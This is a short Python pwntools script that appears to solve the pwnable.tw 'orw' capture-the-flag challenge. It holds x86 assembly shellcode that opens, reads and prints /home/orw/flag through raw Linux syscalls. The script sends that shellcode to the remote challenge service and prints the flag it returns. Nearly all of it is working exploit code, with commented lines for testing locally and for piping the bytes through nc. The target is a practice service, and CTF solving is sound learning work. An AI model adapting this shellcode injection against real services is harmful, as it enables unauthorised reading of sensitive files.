from pwn import *
import sys

#/home//orw//flag
shellcode_asm="""
    xor ecx,ecx
    mul ecx
open:
    mov eax, 0x05
    push ecx
    push 0x77726f2f
    push 0x2f2f7772
    push 0x6f2f2f65
    push 0x6d6f682f
    mov ebx, esp
    int 0x80
read:
    mov ebx, eax
    mov eax, 0x03
    mov edx, 0x2000
    sub esp, edx
    mov ecx, esp
    int 0x80
write:
    mov edx, eax
    mov eax, 0x04
    mov ebx, 0x01
    mov ecx, esp
    int 0x80
exit:
    mov eax, 0x01
    int 0x80
"""

# Test the code using run_assembly, make sure you have 
# /home/orw/flag in your environment
#run_assembly(shellcode_asm)
#sys.exit()

# Print the shellcode as bytes to stdout (use in conjunction with
# | nc chall.pwnable.tw 10001)
#sys.stdout.buffer.write(asm(shellcode_asm))
#sys.exit()

# Open a TCP connection to service
p = remote("chall.pwnable.tw", 10001)
print(p.recvuntil(":"))

# Send the shellcode
p.send(asm(shellcode_asm))

# Read the flag
print(p.recv(256))

